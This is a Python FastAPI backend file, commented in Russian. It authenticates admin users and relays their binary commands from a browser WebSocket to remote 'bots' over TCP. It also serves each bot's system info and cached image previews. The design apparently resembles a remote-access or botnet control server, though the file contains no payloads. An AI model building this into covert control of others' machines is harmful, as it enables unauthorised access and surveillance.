# backend/API/api.py

import json
import uvicorn
import asyncio
from typing import Any, Dict, List, Optional

from fastapi import FastAPI, WebSocket, Body
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse, JSONResponse

import backend.LoggerWrapper as logger
from backend.Config import FRONTEND_PATH
from backend.Database import db_get_users, db_get_bots
from .auth_service import verify_user, get_login_by_token, generate_token
from .connection_manager import manager

from backend.Services.network import NetworkProtocol
from backend.Services.ClientManager import active_clients, preview_cache

app: FastAPI = FastAPI()

app.mount("/sidebar", StaticFiles(directory=FRONTEND_PATH, html=True), name="static")

async def send_binary_to_bot(bot_id: str, packet: bytes) -> bool:
    """Трансляция пакета боту с отладкой сокета."""
    client_connection = active_clients.get(bot_id)
    
    if not client_connection:
        logger.Log.error(f"[API:DEBUG] Bot '{bot_id}' not found in active_clients. Current online: {list(active_clients.keys())}")
        return False

    try:
        _, writer = client_connection
        if not writer.transport.is_closing():
            writer.write(packet)
            await writer.drain()
            logger.Log.success(f"[API:DEBUG] Packet ({len(packet)}b) sent to TCP-socket of Bot: {bot_id}")
            return True
        else:
            logger.Log.error(f"[API:DEBUG] Socket for {bot_id} is closing/closed.")
    except Exception as error:
        logger.Log.error(f"[API:DEBUG] TCP Write Error for {bot_id}: {error}")
    
    return False

@app.get("/")
async def root() -> RedirectResponse:
    """Перенаправление на страницу авторизации."""
    return RedirectResponse("/sidebar/auth/auth.html")

@app.get("/verify_token")
async def verify(token: Optional[str] = None) -> Any:
    """Проверка валидности сессионного токена."""
    if (login := get_login_by_token(token)):
        return {"status": "ok", "login": login}
    return JSONResponse(status_code=401, content={"status": "err"})

@app.post("/login")
async def auth(data: Dict[str, Any] = Body(...)) -> Any:
    """Обработка входа пользователя и генерация JWT-like токена."""
    login_name = data.get("login", "")
    password_text = data.get("password", "")
    
    if (user := verify_user(login_name, password_text)):
        logger.Log.info(f"[API] User {login_name} authenticated")
        return {
            "status": "ok",
            "token": generate_token(login_name),
            "role": user["role"],
            "prefix": user["prefix"]
        }
    return JSONResponse(status_code=401, content={"status": "error", "message": "Invalid credentials"})

@app.websocket("/ws")
async def websocket_endpoint(
    websocket: WebSocket, 
    token: str, 
    login: str, 
    mode: Optional[str] = None, 
    target: Optional[str] = None
) -> None:
    """
    Центральный узел маршрутизации V8.0.
    Обеспечивает мост между WebSocket (Admin) и TCP (Bot).
    """
    user_login = get_login_by_token(token)
    if not user_login or user_login != login:
        # Если сокет еще не принят, FastAPI может ругаться на close без accept
        try:
            await websocket.accept()
            await websocket.close(code=1008)
        except:
            pass
        return

    user_data = db_get_users().get(user_login)
    if not user_data or not await manager.connect(websocket, user_login, user_data):
        return

    try:
        await sync_state(websocket, user_data)

        # Первичная отправка данных о боте при открытии окна контроля
        if mode == "control" and target and NetworkProtocol.has_access(user_data, target):
            bot_db: Dict[str, Any] = db_get_bots().get(target, {"id": target})
            bot_db["status"] = "online" if target in active_clients else "offline"
            
            info_packet: bytes = NetworkProtocol.pack_packet(
                target, "SystemInfo", "json", "none", "none", bot_db
            )
            await websocket.send_bytes(info_packet)
            
            if target in preview_cache:
                preview_packet: bytes = NetworkProtocol.pack_packet(
                    target, "Preview", "bin", "none", "none", preview_cache[target]
                )
                await websocket.send_bytes(preview_packet)

        # ОСНОВНОЙ ЦИКЛ ПРИЕМА КОМАНД ОТ АДМИНА (из браузера)
        while True:
            packet_bytes: bytes = await websocket.receive_bytes()
            
            if len(packet_bytes) >= 8:
                id_length: int = packet_bytes[0]
                # ИСПРАВЛЕНО: Четкое извлечение ID из входящего WS пакета
                # В протоколе V8.0: [8 байт заголовка] + [ID] + ...
                raw_id = packet_bytes[8 : 8 + id_length]
                target_id: str = raw_id.decode(errors="ignore").strip('\x00').strip()
                
                if NetworkProtocol.has_access(user_data, target_id):
                    # Отправляем "как есть" в TCP сокет бота
                    success: bool = await send_binary_to_bot(target_id, packet_bytes)
                    if not success:
                        logger.Log.warning(f"[API:DEBUG] Could not deliver command to bot {target_id}")
                else:
                    logger.Log.error(f"[API:DEBUG] Access Denied for user {user_login} to bot {target_id}")
                        
    except Exception as error:
        logger.Log.debug(f"[API] WebSocket session terminated for {user_login}: {error}")
    finally:
        manager.disconnect(websocket)

async def sync_state(websocket: WebSocket, user_data: Dict[str, Any]) -> None:
    """Синхронизация состояния доступных ботов и первичных превью."""
    try:
        database: Dict[str, Any] = db_get_bots()
        visible_bots: List[Dict[str, Any]] = []
        user_login: str = user_data.get("login", "unknown")
        
        for bot_id, bot_info in database.items():
            if NetworkProtocol.has_access(user_data, bot_id):
                bot_info["id"] = bot_id
                bot_info["status"] = "online" if bot_id in active_clients else "offline"
                visible_bots.append(bot_info)

        if visible_bots:
            sync_packet: bytes = NetworkProtocol.pack_packet(
                "SERVER", "SystemInfo", "json", "none", "none", visible_bots
            )
            await websocket.send_bytes(sync_packet)

        for bot_id, image_bytes in preview_cache.items():
            if NetworkProtocol.has_access(user_data, bot_id):
                await asyncio.sleep(0.005)
                preview_packet: bytes = NetworkProtocol.pack_packet(
                    bot_id, "Preview", "bin", "none", "none", image_bytes
                )
                await websocket.send_bytes(preview_packet)
                
    except Exception as error:
        logger.Log.error(f"[API] State synchronization failed: {error}")

async def run_fastapi_server(host: str, port: int) -> None:
    """Инициализация и запуск сервера uvicorn."""
    config = uvicorn.Config(
        app, host=host, port=port, log_config=None,
        ws_ping_interval=20, ws_ping_timeout=20
    )
    server = uvicorn.Server(config)
    await server.serve()